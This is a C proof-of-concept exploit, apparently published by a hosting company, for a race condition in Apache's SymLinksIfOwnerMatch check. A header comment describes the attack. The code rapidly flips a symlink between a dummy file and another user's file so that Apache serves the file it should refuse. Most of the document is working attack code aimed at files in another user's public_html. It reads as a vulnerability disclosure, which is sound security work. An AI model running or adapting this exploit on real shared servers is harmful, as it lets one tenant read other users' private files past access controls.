/**
 *        Copyright 2014 Bluehost.com
 *
 *    Licensed under the Apache License, Version 2.0 (the "License");
 *    you may not use this file except in compliance with the License.
 *    You may obtain a copy of the License at
 *
 *    http://www.apache.org/licenses/LICENSE-2.0
 *
 *    Unless required by applicable law or agreed to in writing, software
 *    distributed under the License is distributed on an "AS IS" BASIS,
 *    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *    See the License for the specific language governing permissions and
 *       limitations under the License. 
 */

/** Apache Symlink Exploiter.
 *
 *  Proof of concept for exploit where symlinks to files with non-matching UIDs
 *  are served by Apache even when Options +SymLinksIfOwnerMatch is enabled.
 *
 *  The exploit is achieved by very quickly rocking a symlink back and forth
 *  between a file owned by the symlink owner, and file you actually want 
 *  apache to serve, then requesting the symlink through apache hundreds of
 *  times in rapid succession. If everything goes well, you should eventually
 *  hit a race condition between UID checks and apache will serve your target
 *  file.
 *
 */


#include <unistd.h>
#include <stdio.h>
#include <time.h>

/* tsleep() will sleep the thread for approx 1/1000 of a second. No sense
 * in destroying the box that you're trying to exploit by creating and
 * destroying symlinks too fast.
 */
int tsleep() {
    struct timespec tim, tim2;
    tim.tv_sec = 0;
    tim.tv_nsec = 10000;

    if(nanosleep(&tim,&tim2) < 0) {
        printf("Failed during nanosleep.");
        return 1;
    }
    return 0;
}

int main(int argc, char *argv[]) {
    char *target = "/home/target/public_html/targetfile\0"; // The file that you want to served (not owned by the malicious user)
    char *dummy  = "/home/example/public_html/dummy\0"; // The dummy file that must have the same ownership as the malicious user.
    char *sym    = "/home/example/public_html/link\0"; // The symlink that will be rapidly changed.

    /* set up the original symlink with the uids matching */
    symlink(dummy, sym);
    int trv, drv; // target return value, and dummy return value.

    while(1) {
        trv = symlink(target, sym);
        if(trv < 0) {
            printf("Problem linking to target: %i\n", trv);
        }
        tsleep();
        unlink(sym);
  drv = symlink(dummy, sym);
        if(drv < 0) {
            printf("Problem linking to dummy: %i\n", drv);
        }
        tsleep();
        unlink(sym);
    }

    return 0;
}
